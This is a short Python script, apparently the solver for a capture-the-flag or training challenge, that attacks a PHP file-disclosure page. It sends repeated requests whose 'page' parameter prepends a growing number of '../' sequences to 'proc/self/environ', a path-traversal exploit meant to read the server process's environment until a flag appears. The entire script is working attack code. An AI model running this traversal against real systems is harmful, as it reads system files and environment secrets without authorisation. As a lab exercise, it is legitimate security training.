import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://php-lfd-v2.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        i = 0
        while True:
            payload = f"{"../" * i}proc/self/environ"
            response = self.session.get(BASE_URL, params={"page": payload})
            if find_flag(response.text): break

            i += 1

if __name__ == "__main__":
    Solver().main()